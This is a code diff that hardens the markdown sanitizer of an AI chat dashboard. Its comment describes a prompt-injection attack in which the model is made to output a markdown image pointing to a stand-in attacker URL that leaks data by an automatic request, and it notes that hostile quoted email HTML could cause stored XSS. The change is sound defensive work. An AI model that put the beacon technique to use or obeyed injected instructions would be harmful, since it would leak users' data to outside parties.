@@ -54,12 +54,33 @@ function escapeHtml(text) {
     return div.innerHTML;
 }
 
+// Sanitizer allowlist — MUST mirror the server's nh3 policy in
+// dashboard/templatetags/markdown_filter.py (_ALLOWED_TAGS/_ALLOWED_ATTRIBUTES).
+// A bare DOMPurify.sanitize() uses the default profile, which keeps <img>,
+// <style>, and src/srcset/poster/background — so a prompt injection that made
+// the model emit `![x](https://attacker/leak?d=…)` would render an <img> and
+// fire a zero-click outbound GET DURING streaming (carrying whatever the model
+// put in the URL), before the strict server-side render replaces it on reload.
+// Restricting the client sanitizer to the same tag/attr set closes that
+// exfil beacon and keeps the streamed and persisted renders consistent.
+// (ALLOWED_ATTR is global in DOMPurify, so this is the union of the server's
+// per-tag attributes — none of href/title/class/align is an exfil vector, and
+// javascript:/data: hrefs are still blocked by DOMPurify's URI policy.)
+var _SANITIZE_CONFIG = {
+    ALLOWED_TAGS: [
+        'p', 'br', 'a', 'strong', 'em', 'code', 'pre', 'ul', 'ol', 'li',
+        'blockquote', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
+        'table', 'thead', 'tbody', 'tr', 'th', 'td', 'hr', 'del'
+    ],
+    ALLOWED_ATTR: ['href', 'title', 'class', 'align']
+};
+
 function renderMarkdown(text) {
     // Order matters: parse → repair hrefs → sanitize. The model can quote
     // hostile email/document HTML, and marked passes raw HTML through — this
     // innerHTML sink is a stored-XSS path without DOMPurify.
     var html = marked.parse(text).replace(_BARE_APP_HREF, '$1/$2/');
-    return DOMPurify.sanitize(html);
+    return DOMPurify.sanitize(html, _SANITIZE_CONFIG);
 }
 
 // Transient notice for refused/failed actions (409 while a turn is running,
